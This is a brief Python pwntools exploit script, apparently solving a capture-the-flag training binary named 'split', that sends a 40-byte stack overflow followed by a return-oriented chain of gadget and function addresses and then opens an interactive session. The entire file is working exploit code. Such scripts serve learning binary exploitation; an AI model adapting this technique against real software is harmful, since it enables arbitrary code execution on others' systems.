from pwn import *

io = process("./split")

payload = b"a"*40
payload += p64(0x00000000004007c3)
payload += p64(0x601060)
payload += p64(0x000000000040074b)
io.sendline(payload)
#gdb.attach(io)
io.interactive()